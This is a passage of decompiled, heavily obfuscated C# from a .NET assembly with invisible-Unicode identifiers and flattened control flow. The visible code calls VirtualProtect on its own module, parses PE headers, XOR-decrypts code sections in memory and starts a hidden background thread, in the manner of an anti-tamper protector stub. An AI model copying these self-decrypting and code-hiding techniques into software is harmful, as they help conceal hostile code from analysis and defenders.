          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr3, 11, 64U, (uint&) ref method);
          num1 = (int) num21 * -571205173 ^ -1053599914;
          continue;
        case 185:
          int num64;
          num1 = num64 = index5 < (int) length ? -79093966 : (num64 = -1893540289);
          continue;
        case 186:
          int num65;
          num1 = num65 = numArray3[index4] <= num9 ? -1331890625 : (num65 = -1485580201);
          continue;
        case 187:
          *numPtr1 = (byte) 0;
          num1 = -1997657169;
          continue;
        case 188:
          int num66;
          num1 = num66 = numArray3[index7] <= num7 ? -610856649 : (num66 = -952059042);
          continue;
        case 189:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(hinstance + num11, 11, 64U, (uint&) ref method);
          num1 = -1792583173;
          continue;
        case 190:
          *(int*) (numPtr10 + (new IntPtr(3) * 4).ToInt64()) = 0;
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr2, 4, 64U, (uint&) ref method);
          num1 = (int) num21 * -1835945360 ^ -90918972;
          continue;
        case 191:
          ++index6;
          num1 = -1899651629;
          continue;
        case 192:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(hinstance + num7, 11, 64U, (uint&) ref method);
          num1 = (int) num21 * 2124497419 ^ 234998101;
          continue;
        case 193:
          ++num6;
          num1 = -1685643280;
          continue;
        case 194:
          numPtr8 = hinstance + num16;
          num1 = -1265403101;
          continue;
        case 195:
          (hinstance + num11)[index8] = numPtr4[index8];
          ++index8;
          num1 = -198208295;
          continue;
        case 196:
          index13 = 0;
          num1 = (int) num21 * 452438380 ^ 1041529235;
          continue;
        case 197:
          *(int*) (numPtr11 + (new IntPtr(2) * 4).ToInt64()) = 0;
          *(int*) (numPtr11 + (new IntPtr(3) * 4).ToInt64()) = 0;
          numPtr1 = hinstance + num10;
          num1 = (int) num21 * 1522399733 ^ -2030367106;
          continue;
        case 198:
          num1 = (int) num21 * 1883011039 ^ -1220122481;
          continue;
        case 199:
          new Thread(new ParameterizedThreadStart(\u003CModule\u003E.\u202A​⁭⁪‭​‫‍⁮‬‎⁬⁬⁪‮‫‭⁪⁫⁫⁬‮‎‎‍⁭⁪‪‮‭⁭⁭‪‏​‫⁭‫‪⁫‮))
          {
            IsBackground = true
          }.Start((object) null);
          num1 = -496471608;
          continue;
        case 200:
          int num67 = num16 < numArray3[index14] + numArray7[index14] ? 1248064910 : (num67 = 1585124559);
          num1 = num67 ^ (int) num21 * -1657234863;
          continue;
        case 201:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr11, 72, 64U, (uint&) ref method);
          num1 = (int) num21 * 571023742 ^ 178485899;
          continue;
        case 202:
          ++index14;
          num1 = -981697568;
          continue;
        case 203:
          *numPtr1 = (byte) 0;
          num1 = -230618795;
          continue;
        case 204:
          int num68;
          num1 = num68 = index14 < (int) length ? -1147307172 : (num68 = -1794000372);
          continue;
        case 205:
          goto label_3;
        case 206:
          num1 = (int) num21 * -475611944 ^ 1545823008;
          continue;
        case 207:
          int num69;
          num1 = num69 = num6 < (int) num5 ? -1324228108 : (num69 = -2000278929);
          continue;
        case 208:
          num15 ^= num15 >> 27;
          num1 = (int) num21 * 788172414 ^ 1211615645;
          continue;
        case 209:
          ++index4;
          num1 = -328937981;
          continue;
        case 210:
          ++index12;
          num1 = (int) num21 * -1784385327 ^ -1173457332;
          continue;
        case 211:
          *(int*) (numPtr4 + 4) = 1852404846;
          *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
          num1 = (int) num21 * -1799335704 ^ 1332297967;
          continue;
        case 212:
          *numPtr1 = (byte) 0;
          num1 = -612977605;
          continue;
        case 213:
          numArray2[index10] = num15;
          ++index10;
          num1 = (int) num21 * 419986639 ^ 1214504414;
          continue;
        case 214:
          ++numPtr1;
          num1 = (int) num21 * -453882154 ^ -1966294360;
          continue;
        case 215:
          num7 = num7 - numArray3[index7] + numArray4[index7];
          num1 = (int) num21 * -2040975820 ^ -1532920798;
          continue;
        case 216:
          num7 = *(uint*) numPtr7 + 2U;
          num1 = -567793443;
          continue;
        default:
          goto label_219;
      }
    }
label_3:
    return;
label_219:;
  }

  private static void \u202A​⁭⁪‭​‫‍⁮‬‎⁬⁬⁪‮‫‭⁪⁫⁫⁬‮‎‎‍⁭⁪‪‮‭⁭⁭‪‏​‫⁭‫‪⁫‮([In] object obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern unsafe bool \u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(
    [In] byte* obj0,
    [In] int obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static byte[] \u202B⁪‪‪⁮‭‮⁮‎‎‮⁯⁫⁫‮⁫‫​⁮⁬⁮⁮‏⁯⁮⁬​‍‌⁪⁭‍‎‌⁬‬‏‎‫‎‮([In] byte[] obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u202E‍‌‌‌‎‮⁯‬‎‍‭⁮⁬​‪‎‮‮‫‫⁫⁯​​‪‫‭‭⁮⁬​‫‪‍⁮‫‭‮‮<\u002D>([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u200B​⁬⁯‪‮⁫‪‎‎‏‎​‬⁪⁯⁫⁬‏⁮‭​‮⁮‬⁯‎‬⁮‪‪⁮‮‎⁭⁭⁯‭‏‮‮<\u002D>([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206C⁯⁯⁬⁫‮‍‮‮‪⁪‪⁬‪⁮⁬‬‍‬‌‏⁪‬‍‫‮‬‮⁮⁯‬‮‪⁫‬‍⁯⁫‪⁮‮<\u002D>([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206B⁮‎‪‮‎‏‪‌⁪‬‪‮⁬‌‮⁯⁫‬‮⁬⁮​⁮‪‮‮​‎⁭‬‮‎‎‪⁭⁪‍‭⁫‮<\u002D>([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206A‬‪‫‪‌‍‌‫⁯‍⁮‌⁭⁯‫⁪⁫‪‮⁬‎⁫‬⁯‫⁮⁬‍⁯​‫⁯‏‫‭⁯‎‎‬‮<\u002D>([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static void \u206B⁯⁮⁬‭⁮‍‪‏⁯‬‮⁭‌⁫⁪⁫​‍‏⁯⁭‫‍‭⁮​⁪⁭⁬​‏⁭⁫‫‬⁮⁬‭⁮‮()
  {
    // ISSUE: unable to decompile the method.
  }

  internal static Assembly \u200D⁪⁬‭‎⁫‍⁪‫⁮⁭‭⁯⁬‭⁫⁭⁫‍‪‍‫‫‌‌‬⁬‪‎‪⁭⁬‍⁯⁮⁬‬​‭‌‮(
    [In] object obj0,
    [In] ResolveEventArgs obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u206A⁮‏⁯⁭⁮⁪‍‌‬‍⁫⁬‫‫⁪⁪⁭⁭‮‬⁫⁮⁬‏⁮‪‏‫‮⁮‎⁮‫‎⁬‎‍​‍‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static unsafe void \u206F‏⁪‫‏‎⁯⁫‍⁮‏‍‪⁭‌‮⁬​‪‮⁪‫‫⁭‍⁮‫⁭⁬⁯‭⁭⁬‎⁮⁪‏‬‏‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
    bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
label_1:
    int num1 = -845293835;
    while (true)
    {
      uint num2;
      int num3;
      uint* numPtr1;
      uint* numPtr2;
      uint num4;
      uint num5;
      uint num6;
      uint[] numArray1;
      uint[] numArray2;
      uint num7;
      uint* numPtr3;
      uint num8;
      ushort num9;
      uint num10;
      uint num11;
      int index;
      uint num12;
      uint num13;
      uint num14;
      int num15;
      switch ((num2 = (uint) (num1 ^ -1558706815)) % 52U)
      {
        case 0:
          numArray1[14] = numArray1[14] + numArray2[14];
          num1 = (int) num2 * -1699902893 ^ 1838176881;
          continue;
        case 1:
          numArray1[12] = numArray1[12] ^ numArray2[12];
          num1 = (int) num2 * -1480774446 ^ 848628711;
          continue;
        case 2:
          int num16;
          num1 = num16 = num4 < num5 ? -397302495 : (num16 = -1605431357);
          continue;
        case 3:
          num12 = 2483964192U;
          num13 = 3092065000U;
          num1 = (int) num2 * -1174192946 ^ -710843644;
          continue;
        case 4:
          ++index;
          num1 = (int) num2 * -1964064468 ^ 340885397;
          continue;
        case 5:
          int num17;
          num1 = num17 = num7 < num6 ? -1978320641 : (num17 = -1757705578);
          continue;
        case 6:
          num14 = 1698402559U;
          num1 = (int) num2 * -589660053 ^ -551406232;
          continue;
        case 7:
          numArray1[10] = numArray1[10] * numArray2[10];
          numArray1[11] = numArray1[11] + numArray2[11];
          num1 = (int) num2 * 1750664411 ^ 1326965205;
          continue;
        case 8:
          numArray1[13] = numArray1[13] * numArray2[13];
          num1 = (int) num2 * -1224891348 ^ -1613203343;
          continue;
        case 9:
          numArray1[3] = numArray1[3] ^ numArray2[3];
          numArray1[4] = numArray1[4] * numArray2[4];
          numArray1[5] = numArray1[5] + numArray2[5];
          num1 = (int) num2 * 1879054150 ^ 1784661252;
          continue;
        case 10:
          numArray1[8] = numArray1[8] + numArray2[8];
          numArray1[9] = numArray1[9] ^ numArray2[9];
          num1 = (int) num2 * 1407626460 ^ 1102570878;
          continue;
        case 11:
          goto label_29;
        case 12:
          ++num3;
          num1 = (int) num2 * 1264693363 ^ -1275881306;
          continue;
        case 13:
          index = 0;
          num1 = (int) num2 * -840684468 ^ -698217203;
          continue;
        case 14:
          uint* numPtr4 = numPtr3;
          int num18 = (int) *numPtr4 ^ (int) numArray1[(int) num8 & 15];
          *numPtr4 = (uint) num18;
          num1 = -1529556240;
          continue;
        case 15:
          num10 = 1016582733U;
          num3 = 0;
          num1 = (int) num2 * -894183270 ^ -1385796024;
          continue;
        case 16:
          int num19;
          num1 = num19 = index >= 16 ? -521028412 : (num19 = -1779132013);
          continue;
        case 17:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          num1 = (int) num2 * -1748565327 ^ -518286145;
          continue;
        case 18:
          num1 = (int) num2 * -821148725 ^ -1541076458;
          continue;
        case 19:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          num1 = (int) num2 * 816295478 ^ -1379813900;
          continue;
        case 20:
          goto label_1;
        case 21:
          ++num7;
          num1 = (int) num2 * -1169752892 ^ -888214672;
          continue;
        case 22:
          num14 = num12 >> 5 | num12 << 27;
          num1 = (int) num2 * 258550948 ^ -12951371;
          continue;
        case 23:
          numArray1[7] = numArray1[7] * numArray2[7];
          num1 = (int) num2 * 1295295423 ^ -1150247038;
          continue;
        case 24:
          num12 = num13 >> 3 | num13 << 29;
          num13 = num10 >> 7 | num10 << 25;
          num10 = num14 >> 11 | num14 << 21;
          num1 = (int) num2 * 832792097 ^ -627322787;
          continue;
        case 25:
          ++num8;
          num1 = (int) num2 * 892996319 ^ 1909271943;
          continue;
        case 26:
          numArray1[index] = num10;
          numArray2[index] = num12;
          num1 = -1413638905;
          continue;
        case 27:
          if (flag)
          {
            num15 = (int) numPtr1[2];
            break;
          }
          num1 = (int) num2 * -1485265513 ^ 1316995953;
          continue;
        case 28:
          byte* numPtr5 = hinstance + *(uint*) (hinstance + 60);
          num9 = *(ushort*) (numPtr5 + 6);
          ushort num20 = *(ushort*) (numPtr5 + 20);
          numPtr3 = (uint*) null;
          num6 = 0U;
          numPtr1 = (uint*) (numPtr5 + 24 + (int) num20);
          num1 = (int) num2 * 2104629245 ^ -1220065669;
          continue;
        case 29:
          num15 = (int) *numPtr1;
          break;
        case 30:
          numPtr1 += 8;
          num1 = -1783011271;
          continue;
        case 31:
          int num21;
          num1 = num21 = num3 >= (int) num9 ? -1914020688 : (num21 = -333708017);
          continue;
        case 32:
          num1 = (int) num2 * -1034159831 ^ -1779149781;
          continue;
        case 33:
          int num22;
          num1 = num22 = num11 == 0U ? -1605431357 : (num22 = -335794476);
          continue;
        case 34:
          numPtr3 = (uint*) (hinstance + (flag ? numPtr1[3] : numPtr1[1]));
          num1 = -1345839686;
          continue;
        case 35:
          int num23 = num11 != 1831271404U ? 607081067 : (num23 = 579735656);
          num1 = num23 ^ (int) num2 * -340564199;
          continue;
        case 36:
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num1 = (int) num2 * 492813215 ^ 1569193164;
          continue;
        case 37:
          uint num24 = 64;
          \u003CModule\u003E.\u206A⁮‏⁯⁭⁮⁪‍‌‬‍⁫⁬‫‫⁪⁪⁭⁭‮‬⁫⁮⁬‏⁮‪‏‫‮⁮‎⁮‫‎⁬‎‍​‍‮((IntPtr) (void*) numPtr3, num6 << 2, num24, ref num24);
          int num25 = num24 != 64U ? -1049811643 : (num25 = -710430299);
          num1 = num25 ^ (int) num2 * -1271710937;
          continue;
        case 38:
          uint* numPtr6 = numPtr1;
          uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
          int num26 = (int) *numPtr6;
          uint* numPtr8 = numPtr7;
          numPtr1 = (uint*) ((IntPtr) numPtr8 + 4);
          int num27 = (int) *numPtr8;
          num11 = (uint) (num26 * num27);
          num1 = -1244329098;
          continue;
        case 39:
          numArray2 = new uint[16];
          num1 = (int) num2 * -1390014690 ^ -2045087522;
          continue;
        case 40:
          num1 = (int) num2 * 289836345 ^ 682380549;
          continue;
        case 41:
          numArray1[(int) num8 & 15] = (uint) (((int) numArray1[(int) num8 & 15] ^ (int) *numPtr3++) + 1035675673);
          num1 = (int) num2 * -1188894141 ^ 929905399;
          continue;
        case 42:
          num5 = numPtr1[2] >> 2;
          num1 = (int) num2 * -231509769 ^ -2048447345;
          continue;
        case 43:
          goto label_3;
        case 44:
          num4 = 0U;
          num1 = (int) num2 * -805693376 ^ -992092899;
          continue;
        case 45:
          numPtr2 = (uint*) (hinstance + (flag ? numPtr1[3] : numPtr1[1]));
          num1 = -1018078449;
          continue;
        case 46:
          num7 = 0U;
          num1 = (int) num2 * 1003814166 ^ -1953729877;
          continue;
        case 47:
          numArray1[1] = numArray1[1] * numArray2[1];
          num1 = (int) num2 * -140788777 ^ 867062846;
          continue;
        case 48:
          int num28 = ((int) num14 ^ (int) *numPtr2++) + (int) num12 + (int) num13 * (int) num10;
          num14 = num12;
          num12 = num10;
          num10 = (uint) num28;
          ++num4;
          num1 = -80292905;
          continue;
        case 49:
          numArray1 = new uint[16];
          num1 = (int) num2 * 504916890 ^ 1014326716;
          continue;
        case 50:
          numArray1[2] = numArray1[2] + numArray2[2];
          num1 = (int) num2 * -640349644 ^ 1399370656;
          continue;
        case 51:
          num8 = 0U;
          num1 = -1995478293;
          continue;
        default:
          goto label_57;
      }
      num6 = (uint) num15 >> 2;
      num1 = -1605431357;
    }
label_29:
    return;
label_3:
    return;
label_57:;
  }

  internal struct \u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮
  {
    internal uint \u202E‎⁮⁭‎⁫⁮‬‏‏‫‎⁫⁫⁫‮‬‮⁬‭⁮‭‍⁬‏​‪‪‍‎‭‬​⁪⁭⁯⁫‬⁯⁯‮;

    internal void \u202B‬⁫‍⁫⁯‏⁮⁪‮‪⁬⁯‎‬⁬‍‮⁯‮⁯⁮⁬‬‍⁯⁪‎‮‭‏‍⁪⁪​⁪‌‬‎‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u206B⁭‪⁪​​⁪‌‪⁬‌⁭⁬​‎⁬‌‎⁬‮⁯⁮​‌​⁮‫‏‭⁬‪‮⁮‭‪‌⁭⁫‌‏‮(
      [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮
  {
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u200C‫‪⁮‪⁪‭‭‎‭‬⁯‌⁯‬⁯⁬‪‮‪‭‌⁫‮‏⁭‍‍‏⁪‫⁯‏‪⁪‍⁯‪‏‬‮;
    internal readonly int \u202B‏‎⁫⁪⁮⁯​⁮⁯⁬‌​‭‫‍‍⁪⁯‏‮‫‮‪‭‪‮⁬‬⁫⁬‎⁭⁯‌⁬‭⁬⁮‬‮;

    internal \u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C​⁮⁯​​⁫​‌⁫‍‎⁪⁭‫⁮‬⁭⁫⁯‮‫⁫⁭‫‌‎‮⁯‫⁮‏⁯⁫‪⁮‌​⁭‍‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u206F⁯‫‬‬⁫‪⁭‫​⁯‍⁪⁯⁪⁫‭⁯⁬‫⁭‭​‌⁪‭‬⁯⁭‎‮‭‭‫‫​⁯‫‭‮‮(
      [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u206D⁬⁪‮‬⁮‍‌⁪‮‏⁬⁭‬​‬‍‫​‬⁫‪‮⁪‏‪‬‫‎‌⁮‍⁮⁯‍​⁮‌‏⁪‮(
      [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u206B⁫⁫‬‪‌⁫‎⁮⁫‍⁭‌‫‎‎‭​‍⁮⁯⁫‭‍‎‪⁯‫​⁬‮⁭⁮‪⁭⁪‌‭‍⁯‮(
      [In] \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] obj0,
      [In] uint obj1,
      [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj2,
      [In] int obj3)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal class \u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮
  {
    internal uint \u200F‏⁭⁬‮⁪⁬⁭⁬‮‮‮⁭‌‭⁫⁫‪⁫⁭‭‌‮⁫​⁯‪⁮⁮‌‬⁮⁬‪‌⁪​‍‏⁬‮;
    internal uint \u202C​⁭​‏‍‫⁯⁯⁬‍⁪⁭‪⁫​‏⁮‮⁫‬⁭⁫⁮‭‎⁫​⁯⁫⁮⁮‌‫⁪‫⁬‮‭⁭‮;
    internal Stream \u200B‌‏⁮‎‮‪‬‏⁫‍‌‮⁬‪⁮‮‍‭‮⁭⁬‪‏‌‫⁬⁭⁮‎⁫‏⁬‬⁯‭‭‫‭‬‮;

    internal void \u200E‏‌⁪⁯‮⁯‌⁭⁬⁭⁯​‭‍⁭⁬‭‌⁮‫‍⁪​‮⁪‍⁫​‎​‍‏‌⁭‏‮‬⁫‫‮([In] Stream obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D⁭‭‍‪‮‎⁬‮‏⁪‪​⁪‎⁮⁯‮‎⁬​⁫‌​​‎⁪⁮‬‏⁫‍‌⁭‭⁭‮‍‬⁭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206C⁪‌⁫‭‎‌⁫⁯‫⁭‌​​‎‬‪‏‪⁮‬‪⁬‭⁮‬‮‎​⁮‍‎⁮‫⁫‌‌⁪⁭‭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u200D⁫‫‏⁯‪‍‬‪⁫‪‏‫⁮‎‮⁮‌‎‮⁭‬⁫‮‪⁪‬⁮‌⁫‮‎⁮‫‏⁬⁭‫‏⁮‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal \u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal class \u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮
  {
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u200C⁭‮‌​⁯⁯‍‌⁪⁭⁫⁭⁯‏​‭‌‎⁮‭⁫⁮‎‎⁪‭⁪⁪‌⁮‏⁬⁫⁭‎⁪‮‍‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u200F‭⁮‪⁮‬‫⁮‮‎​‫‮‮‍​‬​‬⁯⁯⁪‮​⁭⁮⁪‬‍‬‌‪⁯‪‭‮⁯⁯‭‏‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u206D‭‍⁪‬​⁬‭‪‭⁪⁭‮​‮‮⁮‮⁪‌‫⁪⁭‫⁫‭‬⁫⁫‬‪‎‫‭⁬⁫⁬⁪⁮‌‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u200B⁬⁪⁭‫‭‬⁭⁭​​‫‮‮⁮⁪‬‬⁯⁬⁬‭⁮‏‎⁬⁮⁮‪‍‭⁫⁮​‏‌⁪⁫‬⁯‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u202C‭⁪‬⁪⁯‏‏⁫​‫⁪⁪‪‭‮⁪‫‎⁫‏‬​‫‮‬‏​⁬⁮⁫⁭⁮‮⁭‬⁬⁫⁪‏‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u202D‭‭⁫‎‭‪‌‮‫⁮‎⁪‍‌‍‎⁯‭‪‮‬‏‮⁯‌‏‭⁭⁭⁬⁮‭⁯‮⁬⁪‌⁬⁮‮;
    internal readonly \u003CModule\u003E.\u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮.\u206E‫‭‫⁪‪​‏⁬‎⁮⁭⁫‮⁭⁬⁬⁬⁯⁮‏‭⁯‫⁫⁫⁭‪⁬⁭‏⁭‬‭‍⁪‫‮‏‎‮ \u206A‫⁪⁭​⁬‫‏​‭‮‏​‎⁬‭⁭⁬‎⁫‮‌‫⁮‍‮‎⁪‭‮⁬⁪‭​⁪‌⁯⁮‬⁬‮;
    internal readonly \u003CModule\u003E.\u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮.\u206E⁬‫‪​‎⁬‎‫⁬‍‎⁯‫‎‎⁯​‮‍‏⁭‪‮‪‪‫‭‫‌⁮‭‫‪⁭​⁯‪‫‌‮ \u200E‭​⁯‌‪⁫⁯⁮‎⁯​⁭‮‭‍‫⁮⁭⁯⁬⁭⁮‫⁭‏‍⁬‌⁯‎⁭‫‎‪‫⁭‎⁭‭‮;
    internal readonly \u003CModule\u003E.\u200C‬⁯‪‍‌⁪​⁫⁫‮‍‭⁪⁪‍⁮‪⁫⁪‍⁬⁪⁬‎‏‪‪‫‍‍⁮⁯‍‍⁭⁫‎‎‭‮ \u200E⁯‎‮​‍⁮⁯​⁬‭⁫‭⁪‫⁪‬‪‮‍‏⁫⁯‪⁯‪​‫‫⁯‪⁪​‬⁯‌‫‭‎⁫‮;
    internal readonly \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u200E⁫‬‌‪‌‫‏‍⁮‬‍⁫‪‫‬‌⁬‪⁫‮‮‪⁯‍‫⁬‏‫⁫‎⁭‮‪⁭⁪⁮‎⁪‮;
    internal readonly \u003CModule\u003E.\u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮[] \u206D‏⁫‌‭‎‫⁭‮⁯⁫⁮‎⁭‎‏⁪‮‏⁭⁬‎⁫‪⁭⁬‭‮⁯‏⁬‪‭⁭⁫‏‪‭‮⁪‮;
    internal readonly \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ \u206A‍‮‎⁬‌⁫‬⁮‎⁪⁪‍⁭‫‪‎⁬⁬‫⁬‌‪⁬‭​⁫⁯⁯⁬‌‮‏⁮‬‌‫⁫‍⁪‮;
    internal readonly \u003CModule\u003E.\u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮.\u206E‫‭‫⁪‪​‏⁬‎⁮⁭⁫‮⁭⁬⁬⁬⁯⁮‏‭⁯‫⁫⁫⁭‪⁬⁭‏⁭‬‭‍⁪‫‮‏‎‮ \u200E‍‮‫⁮‏​⁬‫⁪‭‬‍⁮⁯‭⁪‮‬‍‏⁮⁯‫​⁭⁪‌⁪⁪‍‏⁮‬⁫⁫⁯‭⁯⁫‮;
    internal bool \u200F‌‭‫⁮‏⁯​‬​⁪‏‏​‏‬‌⁬‪‬⁮‪‍⁬⁯‏‫‬‏‏‍‏‪‬⁮‫⁬‫‫⁫‮;
    internal uint \u206D⁯‏‎⁭‎⁫‏⁫‮‍‏‬⁫‭‎⁭‫‌⁯⁯‮⁯‪⁯‬‬⁪⁪⁯‮⁬⁫‎⁬⁫‫‪‌⁭‮;
    internal uint \u202A‌‍‌‬⁮‮‫​⁮​⁪‪‎​‍‬⁬⁪⁯⁫‌‪⁬⁬‍‮‫‏‭‌⁯‌⁬‮‍‌⁬⁫⁭‮;
